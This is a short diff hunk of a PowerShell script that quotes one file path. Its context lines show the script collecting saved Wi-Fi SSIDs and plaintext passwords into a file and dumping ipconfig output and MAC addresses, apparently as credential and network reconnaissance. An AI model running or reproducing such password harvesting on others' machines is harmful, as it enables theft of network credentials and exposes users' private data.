@@ -25,7 +25,7 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
     "SSID:$ssid | Password:$pass" | Out-File -Append -FilePath $wifiFile
 }
 
-ipconfig /all | Out-File $e\ipcfg.txt
+ipconfig /all | Out-File "$e\ipcfg.txt"
 
 
 $mac  = (Get-NetAdapter).MacAddress
